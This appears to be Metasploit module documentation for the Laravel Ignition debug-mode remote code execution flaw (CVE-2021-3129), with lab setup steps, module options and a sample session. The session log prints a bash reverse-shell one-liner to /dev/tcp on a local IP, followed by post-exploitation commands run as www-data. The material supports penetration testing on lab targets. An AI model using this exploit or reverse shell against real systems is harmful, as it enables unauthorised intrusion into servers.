## Vulnerable Application

Ignition prior to 2.5.2, as used in Laravel and other products, allows unauthenticated remote malicious users to execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). This is exploitable on sites using debug mode with Laravel prior to 8.4.2.

This module has been tested successfully on Debian 10.7 (x86_64) with kernel version 5.10.60.

The easiest way to deploy a vulnerable application is to use the image from the vulhub project available over docker compose [here](https://github.com/vulhub/vulhub/blob/master/laravel/CVE-2021-3129/docker-compose.yml). However this container doesn't come
with the required log file created, then it needs to be created manually in the path `/var/www/storage/logs/laravel.log`.

## Verification Steps
Confirm that functionality works:
1. Start `msfconsole`
2. `use exploit/multi/php/ignition_laravel_debug_rc`
3. set `RHOSTS` and `RPORT`
4. Confirm the target is vulnerable: `check`
5. Confirm that the target is vulnerable: `The target is vulnerable.`
6. It come already with a default payload `cmd/unix/reverse_bash`
7. `set LHOST`
8. `exploit`
9. Confirm you have now a cmd session

## Options

### TARGETURI (required)

The path to the Ignition _solutions_ file to exploit. By default, the path is  `/_ignition/execute-solution`.

### LOGPATH (optional)

Path to Laravel's log file, which contains every PHP error and stack trace. By default it is stored in `storage/logs/laravel.log`. If not defined this module will try to automatically determine it based on the stack trace of the application.


## Scenarios
```
msf6 exploit(multi/php/ignition_laravel_debug_rce) > exploit

[+] bash -c '0<&65-;exec 65<>/dev/tcp/172.28.241.244/4444;sh <&65 >&65 2>&65'
[*] Started reverse TCP handler on 172.28.241.244:4444
[*] Checking component version to 172.28.240.1:8080
[*] Debug mode is enabled.
[*] Found PHP 7.4.15 running Laravel 8.26.1
[*] Found log file /var/www/storage/logs/laravel.log
[*] Command shell session 2 opened (172.28.241.244:4444 -> 172.28.240.1:56840 ) at 2022-02-08 11:32:12 +0100

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
php /var/www/artisan --version
Laravel Framework 8.26.1
head ../vendor/facade/ignition/CHANGELOG.md
# Changelog

All notable changes to `ignition` will be documented in this file

## 2.5.1 - 2020-11-13

- add support for LiveWire component urls

## 2.5.0 - 2020-10-27

uname -a
Linux 9f96df025a2b 5.10.60.1-microsoft-standard-WSL2 #1 SMP Wed Aug 25 23:20:18 UTC 2021 x86_64 GNU/Linux
cat /etc/debian_version
10.7
exit
[*] 172.28.240.1 - Command shell session 2 closed.
```

### Version and OS
This module has been tested successfully on Debian 10.7 (x86_64) with kernel version 5.10.60. Details as below: 

* PHP 7.4.1
* Laravel Framework 8.26.1
* Ignition 2.5.1
* Debian 10.7